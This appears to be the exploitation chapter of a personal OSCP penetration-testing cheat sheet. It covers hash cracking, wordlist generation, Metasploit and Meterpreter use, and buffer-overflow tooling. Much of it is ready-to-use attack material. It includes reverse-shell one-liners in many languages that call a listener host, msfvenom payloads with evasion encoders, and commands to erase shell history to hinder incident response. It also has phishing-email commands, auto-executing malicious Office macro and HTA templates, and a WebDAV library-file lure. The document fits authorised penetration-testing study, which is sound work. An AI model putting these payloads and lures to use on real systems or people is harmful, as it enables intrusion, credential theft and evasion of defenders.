
# 3 Exploitation

## 3.1 Searchsploit

```sh
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```


## 3.2 Cracking Password Hashes

Here are my favorite wordlists to try:

```
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt
```

### 3.2.1 Identifying Unknown Hash Format

```sh
hashid 'HASHGOESHERE'
hash-identifier 'HASHGOESHERE'
```

I also have my [hashcat mode finder](https://github.com/camercu/dotfiles/blob/main/hashcat-mode-finder/hashcat-mode-finder.plugin.zsh) plugin, which does fuzzy searching on hash names and hash contents against hashcat's example hashes.

Here is a bash function version of it:

```bash
# fuzzy-search hashcat modes
# source: https://jonathanh.co.uk/blog/fuzzy-search-hashcat-modes.html
# NOTE: fzf and hashcat required to be installed
function hcmode {
    hashcat --example-hashes | grep -E 'MODE:|TYPE:|HASH:|Hash mode #|Name\.*:|Example\.Hash\.*:|^$' | awk -v RS="\n\n" -F "\t" '{gsub("\n","\t",$0); print $1 "\t" $2 "\t" $3}' | sed 's/MODE: //; s/Hash mode #//; s/TYPE: //; s/ *Name\.*: //; s/Example\.Hash\.*://; s/HASH: //' | fzf -d '\t' --header="Mode   Type" --preview='echo HASH: {3}' --preview-window=up:1 --reverse --height=40% | awk '{print $1}'
}
```



### 3.2.2 Cracking with John The Ripper

Use john for the common cases of cracking.

```sh
# afer collecting /etc/passwd and /etc/shadow
unshadow passwd shadow > unshadowed

# crack unshadow
# the "=" is required for wordlist
john --wordlist=/mnt/vm-share/rockyou.txt unshadowed

# crack hashes by feeding back in the potfile to a different hash mode
john --loopback --format=nt ntlm.hashes

# find the desired format, if john doesn't detect it automatically:
john --list=formats

# feed custom wordlist via stdin
crunch 7 7 -t @@@@@@@ | john --stdin hashes
# can also use "--pipe" to bulk read and allow rules

# resume last cracking session that was stopped mid-way
john --restore

# show cracked hashes from potfile matching those in hashfile
john --show --format=nt hashfile
```

You can add hashcat-style rules to John-the-Ripper's configuration!

- Add a new `[List.Rules:MyRules]` label to `/etc/john/john.conf`
- Under the new label, add you hashcat rules

```sh
# text to be appended to john.conf
cat my.rule
[List.Rules:MyRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# appending rules with label to john.conf
sudo sh -c 'cat /home/kali/passwordattacks/my.rule >> /usr/share/john/john-local.conf'
# config files, loaded in order:
# /etc/john/john.conf
# /usr/share/john/john.conf
# /usr/share/john/john-local.conf

# specifying custom ruleset to use
john --wordlist=passwords.txt --rules=MyRules ssh.hash
```

**NOTE**: John doesn't like spaces between long-options like `--wordlist`, `--rules`, and `--format` and their argument. **Make sure you use equals (`=`**)! Example `--rules=MyRules`.



### 3.2.3 Cracking with Hashcat

When to use hashcat:
- You have a hash type that john doesn't understand
- You need MOAR SPEED

```sh
# hashcat doesn't automatically ID hashes like john. You have to specify the
# hash mode manually with the "-m" flag. Look up hashcat modes at:
# https://hashcat.net/wiki/doku.php?id=example_hashes
# or do:
hashcat --help | grep -i "md5"
hashcat --example-hashes | grep -FB2 ' $1$'  # "-F"=force raw string lookup

# specify mangling rules with addition of:
-r /usr/share/hashcat/rules/best64.rule
# more extensive rule list:
-r /usr/share/hashcat/rules/d3ad0ne.rule
# Great one for rockyou.txt:
-r /usr/share/hashcat/rules/rockyou-30000.rule

# basic crack syntax:
# hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]

# common options:
# -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)
# -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)

# cracking /etc/shadow with sha512crypt hashes ("$6$...")
hashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt

# resume last cracking session that was stopped mid-way
hashcat --restore

# showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes
# hashcat has a potfile (hashcat.potfile) to store old passwords
hashcat --show --user --outfile-format=2 shadow

# crack all LANMAN hashes with hashcat
# '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3
# '--increment/-i' starts at zero-length and increments to full length of mask
# '--potfile-path' specfies custom potfile
hashcat -a 3 -m 3000 -1 "?u?d?s" --increment --potfile-path hashcat.potfile customer.ntds "?1?1?1?1?1?1?1"

# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
# '--increment-min' specifies min length to start mask bruteforce
hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
```

**NOTE**: hashcat doesn't feed usernames into the wordlists automatically like john
does, nor does it automatically reverse the usernames. To do this, you have to
manually add the usernames as an additional wordlist file, and add mangling
rules.

:warning:**NOTE**: If you see `Token Length Exception` after a failed attempt to crack hashes with hashcat, this is a known bug where it doesn't support modern encryption ciphers with certain mode numbers. In this case, ***try switching to John to crack***.

**Attack modes:**

- `0` - Straight: dictionary/wordlist, tries each word from every wordlist file once
- `1` - Combinator: using 2 wordlist files, each word from first file is prepended to each word in second file; can use same file twice
- `3` - Mask: brute force with characters fitting the supplied mask (in place of wordlist)
  - `?l` = lowercase ASCII letters
  - `?u` = uppercase ASCII letters
  - `?d` = digits 0-9
  - `?s` = printable special characters + space
  - `?a` = all of `?l` + `?u` + `?d` + `?s`
  - Example: 1 uppercase, followed by 2 lowercase, followed by 3 digits: `?u?l?l?d?d?d`
- `6` - Hybrid Wordlist + Mask: append mask to each word in wordlist
- `7` - Hybrid Mask + Wordlist: prepend mask to each word in wordlist

### 3.2.4 Making Custom Wordlists

**`cewl`** for scraping words from websites:
```sh
# cewl spiders a site starting at URL to scrape words
# -e : include emails
# --email_file FILE : save emails in separate file
# -w FILE : write words to file
# --lowercase : convert all words to lowercase
# --with-numbers : include words with numbers
# -d NUM : max depth to spider (0 = only that page)
# -m NUM : minimum word length
cewl -e --email_file emails.txt -w cewl.txt --lowercase --with-numbers -d 1 -m 5 URL
```

**`crunch`**:
```sh
# predefined charsets found in:
cat /usr/share/crunch/charset.lst

# Syntax:
# crunch <min-len> <max-len> [ charset1 [ charset2 [ charset3 [ charset4 ]]]] [options]

# Cmdline Flags:
# -t PATT : use pattern, replacing placeholders ( @ , % ^ ) (see next)
# -l PATT : literal mask - which placeholder chars in '-t' should be literal.
#           Must match length of PATT used in '-t'.
#           E.g. -t p@ssword%! -l p@sswordx! : makes @ a literal, % still placeholder
# -o FILE : write output to file
# -f : Specifies a character set from the charset.lst file
# -s WORD : start at word
# -e WORD : end at word
# -p CHARSET / WORD WORD... : permute from charset/words (no repeats), MUST BE LAST OPTION
# -q FILE : like '-p', but takes chars/words from file

# Charset Placeholders for '-t':
#   @ : 1st, or lowercase
#   , : 2nd, or uppercase
#   % : 3rd, or digits
#   ^ : 4th, or symbols

# Tip: if you don't want to count the characters in '-t' pattern, 
# just put 1 for min and max lenght. It will tell you how long 
# your pattern is when it errors out


##  Examples  =====================================================

# all possible 4 to 6 digit numeric PIN codes
crunch 4 6 0123456789

# matching template "Secret###!"
crunch 10 10 -t 'Secret%%%!' -o wordlist.txt

# every number between 1950 and 2050 (useful for years)
crunch 4 4 -t %%%% -s 1950 -e 2050

# seasonal passwords (e.g. Summer2020!)
crunch 6 6 '@!#$' -t s%%%%@ -p Spring Summer Autumn Fall Winter
```

**`hashcat`**:
```sh
# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
# '--increment-min' specifies min length to start mask bruteforce
hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
```


### 3.2.5 Password Cracking Examples

KeePass databases (`*.kdbx`):

```sh
# convert to friendly format
keepass2john Database.kdbx | tee keepass.hash

# remove "Database:" from beginning
vim keepass.hash

# crack with rockyou + rules
hashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt
```


ZIP files:

```sh
# using fcrackzip
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip

# using john
zip2john myfile.zip | tee zipkey.john
john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
```



## 3.3 Reverse Shells

- [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)

Always start your **Netcat Listener** first!

```sh
nc -vlnp LISTEN_PORT
# on mac, exclude the "-p" flag
```

**Netcat Reverse Shell**

```sh
# if netcat has the -e flag:
nc -e /bin/sh LISTEN_IP 443
# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=tun0

# if no -e flag:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=tun0
```

**Bash Reverse Shell**

```sh
# only works on Linux with bash
/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=tun0
```

**Python Reverse Shell**

```sh
python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# daemonizing shell for *nix hosts
python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=tun0
```


**PHP Reverse Shell**

```sh
# may have to try different socket numbers besides 3 (4,5,6...)
php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl Reverse Shell**

```sh
perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=tun0
```

**Powershell Reverse Shell**

Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Alternatively, you can create a PowerShell reverse shell with msfvenom:

```sh
msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=tun0
```

If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:

```sh
# base64-encoding custom powershell 1-liner
echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo

# msfvenom version
msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
```

Also, you can use `powercat.ps1`, a netcat equivalent in PowerShell, with "-e" support.

```sh
cp /usr/share/windows-resources/powercat/powercat.ps1 .
sudo python -m http.server 80
nc -lvnp 6969
```

Invoke with:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://LISTEN_IP/powercat.ps1");powercat -c LISTEN_IP -p 6969 -e powershell
```



**OpenSSL Encrypted Reverse Shell**

```sh
# generate key on server
openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
# Start server listener
sudo openssl s_server -accept 443 -key key.pem -cert cert.pem

# Client-side reverse shell
rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
```


**Socat Listener**

Great to support full tty and/or encryption. See Socat Reverse Shell (next).

```sh
# full tty over TCP
# "-dd" prints fatal, error, warning, and notice messages
socat -dd file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT

# no tty, plaintext over TCP
socat -dd TCP-LISTEN:LISTEN_PORT STDOUT

# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
socat -dd file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
```

Note: to generate `mycert.pem` see [these instructions](#1051-create-self-signed-ssltls-certificate)


**Socat Reverse Shell**

Use with Socat Listener (previous)

```sh
# with full tty
socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443

# no tty, text only
socat -dd EXEC:/bin/bash TCP:LISTEN_IP:443

# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0
```

For Windows victim, replace `/bin/bash` with `cmd.exe` or `powershell.exe`



**MSFVenom**

You can use `msfvenom` to generate reverse shells easily.

```sh
# Basic Windows TCP reverse shell
msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0

# Basic Linux TCP reverse shell
msfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=tun0

# web-based reverse shells
# asp
msfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=tun0
# jsp
msfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=tun0
# war
msfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=tun0
# php
msfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=tun0

# Windows DLL that invokes commands you tell it:
msfvenom -p windows/exec -f dll -o shell32.dll cmd="C:\windows\system32\calc.exe"
```

Getting help:

```sh
# list all available payloads
msfvenom --list payloads
# list payloads for specific platform and architecture
msfvenom -l payloads --platform windows --arch x64

# view payload options
msfvenom -p PAYLOAD --list-options

# list encoders
 msfvenom -l encoders
 
 # list allowed output formats
 msfvenom -l formats
```

Custom encoding:

- `-e x86/shikata_ga_nai` - best x86 encoder for evasion
- `-e x64/xor` - decent x64 option
- `-i / --iterations <count>` - number of encoding iterations (more = better evasion, bigger payload)

Avoiding bad bytes (requires custom encoding): `-b "\x00\x0A"`

Prepending nopsled: `-n, --nopsled <length>`

Shrinking your payload: `--smallest`

For some Windows shellcode (mainly buffer overflow exploits), you might need to specify `EXITFUNC=thread` or `EXITFUNC=seh` as an option to make sure the shellcode executes and exits cleanly.



### 3.3.1 Running a detached/daemonized process on Linux

When delivering a payload, sometimes it needs to run as a daemon so it doesn't
die when the session/connection is closed. Normally you do this with `nohup`,
`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
Still, you can accomplish creating a daemonized process by using sub-shells:

```sh
( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
```



### 3.3.2 Covering your tracks

When you connect via a reverse/bind shell, your commands get saved in the
terminal history. To avoid logging this (to make incident response team's job
harder), use the following as your first command:

```sh
# for bash, sh
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
# for zsh, must tell it not to store anything in history
# source: https://stackoverflow.com/a/68679235/5202294
function zshaddhistory() {  return 1 }
```

```powershell
# for Windows PowerShell
Set-PSReadlineOption –HistorySaveStyle SaveNothing
# - or -
Remove-Module PSReadline
```



### 3.3.3 Upgrading to Interactive Shell

Use this if you have a netcat-based reverse shell coming from a Linux box.

```sh
###  In reverse shell  ##########
# you might need to fix your PATH first
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

# start pty using python
python3 'import pty; pty.spawn("/bin/bash")'
# windows equivalent
c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'

# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell

###  In local shell  ##########
# Get TTY rows/cols for later:
stty size # prints "rows cols"
# ignore hotkeys in the local shell and get back to remote shell
stty raw -echo; fg # hit enter TWICE after this

###  In reverse shell  ##########
# set correct size for remote shell (ROWS and COLS from stty size)
stty rows ROWS cols COLS
# enable terminal colors
export TERM=xterm-256color
# reload bash to apply TERM env var
exec /bin/bash

```


## 3.4 Metasploit

The Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.

Initializing Metasploit (first time running it):

```sh
# initialize the metasploit postgres database
sudo msfdb init

# enable postgres to start on boot
sudo systemctl enable postgresql
```

After the database starts, you can use any of the following commands to manage the database:

- `msfdb reinit` - Deletes and reinitializes the database.
- `msfdb delete` - Deletes the database.
- `msfdb start` - Starts the database.
- `msfdb stop` - Stops the database.
- `msfdb status` - Shows the database status.

### 3.4.1 Interacting with Metasploit via `msfconsole`

Most common `msfconsole` commands:

```sh
# get list of commands or detailed help
help [COMMAND]
# find module you want
search KEYWORDS...
# activate the module
use NUM
# get detailed info about active module
info
# view module options
show options
# set module options
set OPTION VALUE
# execute the module
run
```

Detailed interaction reference:

```sh
# start the console
# optional args:
# -q : don't display animations, banner, and version on start
# -x '<COMMANDS>' : commands to run on start (quote the entire command string).
#                   Multiple commands separated by semicolon.
# -r FILE : load resource script (.rc) file and run those commands at start
#           (see section on resource scripts)
msfconsole


# inside the msfconsole:

# check the database status
msf6> db_status
# check what workspace you're using
# workspaces help isolate data from different assessments/subnets
# (the database saves everything)
msf6> workspace
# add a workspace
msf6> workspace -a NAME
# change workspaces
msf6> workspace OTHERNAME
# delete workspace
msf6> workspace -d NAME


# working with modules:

# search for module containing specific keywords
msf6> search Apache 2.4.49
# restrict search to exploits
msf6> search type:exploit smb
# restrict search to auxiliary modules (scanners, brute-forcers, etc.)
msf6> search type:auxiliary smb
# view description, reliability, etc. info of a module
# if you want to view info on active module, omit arg
msf6> info [module-name-or-search-number]
# Choose a module to activate
msf6> use 56
# view arguments/options to set for active module
# at a minimum, RHOSTS is usually a required arg
msf6 auxiliary(scanner/smb/smb_version) > show options
# set value for option (option name not case-sensitive)
msf6 auxiliary(scanner/smb/smb_version) > set rhosts VICTIM_IP
# unset an option
msf6 auxiliary(scanner/smb/smb_version) > unset rhosts
# set RHOSTS based on discovered hosts/services in database
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
# set (global) option to persist accross all modules
msf6 auxiliary(scanner/smb/smb_version) > setg rhosts VICTIM_IP
# unset a global option
msf6 auxiliary(scanner/smb/smb_version) > unsetg rhosts
# show advanced options for the module
msf6 auxiliary(scanner/smb/smb_version) > show advanced
# execute the active module (once required options set)
msf6 auxiliary(scanner/smb/smb_version) > run

# when working with exploits

# show list of all compatible payloads for active exploit module
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
# chose payload to use (can use number from 'show payloads')
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload NUM_OR_NAME
# set payload options same way as exploit module options
# (you can specify an interface name, and it'll auto-pull your IP)
msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost tun0


# using data stored in the database:

# run nmap scan and save results to msfdb workspace
msf6> db_nmap <nmap-options>
# list all discovered hosts in msfdb workspace
msf6> hosts
# NOTE: you an tag hosts and search by tags.
# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole
# list all discovered services
msf6> services
# list all discovered services for port 8000
msf6> services -p 8000
# check if metasploit automatically detected any vulnerabilities
msf6> vulns
# view any saved/discovered credentials from brute force scans
msf6> creds


# meterpreter sessions and routing tables:

# view list of sessions
msf6> sessions
# resume interaction on backgrounded session
msf6> sessions -i SESS_ID
# add route to metasploit's routing table for attacking internal targets
# this lets you do things like run port scans or throw exploits against
# internal hosts from inside metasploit
msf6> route add CIDR_INTERNAL_SUBNET SESSION_ID
# view existing msf routing table
msf6> route print
# clear all routes from table
msf6> route flush
```



### 3.4.2 Metasploit Resource Scripts

When starting `msfconsole` with the `-r` flag, you pass it a "resources" script (`.rc`) file that contains a series of instructions to run as soon as metasploit starts.

**NOTE:** There are lots of pre-made resource scripts located here:

```sh
ls -l /usr/share/metasploit-framework/scripts/resource
```

Here is an example file. The script looks exactly like a series of commands you'd type in the interactive console.

```sh
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost LHOST
set lport 443
# cause the spawned Meterpreter to automatically launch a background notepad.exe
# process and migrate to it. Automating process migration helps to avoid 
# situations where our payload is killed prematurely either by defensive 
# mechanisms or the termination of the related process
set AutoRunScript post/windows/manage/migrate
# ensure that the listener keeps accepting new connections after a session is created
set ExitOnSession false
# run module as a job in the background and stop us from automatically interacting with the session
run -z -j
```


### 3.4.3 Meterpreter command basics

One payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).

```sh
# view list of meterpreter commands
meterpreter> help
# get information about victim system
meterpreter> sysinfo
# get username
meterpreter> getuid
# drop into interactive bash/cmd.exe shell
meterpreter> shell
# to suspend the shell to background, use Ctrl+z
# list backgrounded shells (called 'channels'):
meterpreter> channel -l
# interact with backgrounded channel (shell)
meterpreter> channel -i NUM
# download file from victim
meterpreter> download /etc/passwd
# upload file to victim
meterpreter> upload /usr/bin/unix-privesc-check /tmp/
# attempt to auto-privesc to SYSTEM (on Windows host)
meterpreter> getsystem
# migrate your process to the memory of another process
meterpreter> ps # find another process running with same user as you
meterpreter> migrate PID # move your process to the memory of another process
# spawn a process hidden ('-H') from user (no window)
meterpreter> execute -H -f iexplore.exe
# use mimikatz functionality to grab credentials
meterpreter> load kiwi
meterpreter> creds_all
# add local port forward rule via meterpreter
meterpreter> portfwd add -l LPORT -p RPORT -r RHOST
# send this meterpreter session to background (return to msf console)
meterpreter> bg
# shut down meterpreter agent
meterpreter> exit
```


### 3.4.4 Metasploit Modules and Payloads

Metasploit modules are located in:

```
/usr/share/metasploit-framework/modules/
```

These are the types/categories of Metasploit modules:

- **Exploit** - Exploits a vulnerability in a system/service, injecting your shellcode/command payload.
- **Auxiliary** - Does not execute a payload, but can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.
- **Post-Exploitation** - Enables you to gather more information or to gain further access to an exploited target system. E.g. hash dumps and service enumerators.
- **Payload** - A payload is the shell code that runs after an exploit successfully compromises a system. Defines what you want to do to the target system after you take control of it (e.g. Meterpreter, TCP reverse shell, run shell command).
- **NOP generator** - A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers.

Metasploit **payloads** are either *single* (non-staged) or *staged*:
- *Single* payloads are entirely self-contained, fire-and-forget, and typically have a larger size, but they are more stable. They have extra **underscores** in their name (`linux/shell_reverse_tcp`).
- *Staged* payloads are basically a dropper that fetches and executes the rest after a callback. They are smaller in size, but can be less stable, and they require a metasploit handler to be listening to serve up the rest of the payload. They use extra **slashes** in their name (`linux/shell/reverse_tcp`).


## 3.5 Buffer Overflows

I wrote a great python script for tackling the old-school OSCP BOF boxes.
Check it out [here](tools/pwn-bof-template.py).

For quick-and dirty offset finding, sometimes you can try something like:

```sh
# using radare2's ragg2 utility for pattern generation:
ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
# look up offset (note: must be hex value with '0x' at start!):
ragg2 -q 0x414a4141

# using msf's pattern_create.rb:
msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
# look up offset (can be either hex value or string)
msf-pattern_offset -q 2Aa3
```

In Windows' Immunity Debugger, you can use [mona.py](https://github.com/corelan/mona) for building exploits.
Here are some useful commands:

```sh
# To make mona easier to work with, set a custom working folder:
!mona config -set workingfolder c:\mona

# find the offset of EIP register in your buffer:
!mona findmsp -distance <PATTERN_SIZE>
# equivalent to:
msf-pattern_offset -q EIP_VAL

# Check for bad bytes. First start with baseline pattern that uses all bytes
# except null:
!mona bytearray -b "\x00"
# Then compare your memory at ESP with the baseline:
!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDR>
# Finally, add any found bad bytes to the list, repeating the exploit/check
# until you get "Unmodified" status after running the compare command.

# find 'jmp esp' gadget, excluding bad bytes in the pointer
!mona jmp -r esp -cpb '\x00\x51'
```



## 3.6 Client-Side Attacks

### 3.6.1 Phishing Emails

To send a phishing email with a malicious attachment, you can use the `swaks` tool:

```sh
# first, write a semi-convincing email body:
vim body.txt

# and create your malicious attachment
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0

# then send the email
swaks -t recipient1@example.com -t recipient2@example.com --from fakesender@example.com --attach @derp.hta --server SMTP_SERVER --body @body.txt --header "Subject: Clickbait" --suppress-data -ap
# it will prompt to input username and password if it's not an open SMTP server
```

Another option is to use the `sendemail` tool:

```sh
sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
```

A third option is to configure the Thunderbird email application to use the SMTP credentials to send your email via a GUI. When you're done, delete the profile from Thunderbird by opening the profile manager:

```sh
# open profile manager to delete old profiles
thunderbird -p
```


### 3.6.2 HTA Files

Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).

Send one of these files to a user (or a link to one), and if they execute it, you win.

Here's the basic template (save as `derp.hta`):

```html
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```

You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:

```sh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
```


### 3.6.3 Malicious Office Macros

You can exploit windows machines by sending a malicious Office file containing macros to the user. When they open the document, it'll execute your payload in your macro.

Here's the basic template of a malicious macro (replace the string "MALICIOUS COMMANDS HERE" with your payload):

```vb
Sub Document_Open()
    PWN
End Sub

Sub AutoOpen()
    PWN
End Sub

Sub PWN()
    Const DontWaitUntilFinished = False,  WaitUntilFinished = True
    Const ShowWindow = 1, DontShowWindow = 0
    Dim cmd as String
    cmd = cmd + "MALICIOUS COMMANDS HERE"
    set sh = CreateObject("WScript.Shell")
    sh.Run cmd, DontShowWindow
End Sub
```

Because VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a `powercat.ps1` reverse shell payload into the string.

- [mkpowercat.py](tools/win/mkpowercat.py)
- [vbsify.py](tools/win/vbsify.py)

Example Usage:

```sh
# create powercat macro payload
./mkpowercat.py | ./vbsify.py

# put powercat in current directory
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# host file on http server
python3 -m http.server 80

# catching reverse shell callback:
nc -lvnp 443
```

Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.


### 3.6.4 Windows Library Files

You can use Windows Library files to mount a pseudo-filesystem pointing to an attacker-owned WebDAV server, which hosts malicious files you want the user to execute. The benefit of this technique is that antivirus doesn't seem to scan files on your WebDAV server like it does emailed office macros.

This technique uses a malicious `.lnk` file that starts a reverse shell when the user clicks on it.

First, start your WebDAV server:

```sh
# install wsgidav (WebDAV server)
pip3 install --user wsgidav

# make a folder that we want to host publicly
mkdir webdav

# start the server with open access
wsgidav --host=0.0.0.0 --port=8000 --auth=anonymous --root webdav/
# you can confirm this is running by going to http://127.0.0.1:8000 in your browser
```


To make a Windows Library file that points to our WebDAV server, we create an XML file with the `.Library-ms` extension. The file's basename is the "path" displayed to the user in their Explorer window. Make it blend in for client-side attacks.

Change the `<url>` field below, and save it as `Helpers.Library-ms` (or whatever):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <!-- version can be any number we choose -->
  <version>7</version>
  <!-- pin directory in Windows Explorer -->
  <isLibraryPinned>true</isLibraryPinned>
  <!-- imageres.dll pics from all Windows icons -->
  <!-- '-1003' is Pictures folder icon -->
  <!-- '-1002' is Documents folder icon -->
  <iconReference>imageres.dll,-1003</iconReference>
  <!-- templateInfo determines appearance and columns visible in Explorer window -->
  <templateInfo>
    <!-- Documents GUID -->
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <!-- searchConnector... specifies the storage location(s) the library points to -->
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <!-- use default behavior when user saving at this location, to blend in -->
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
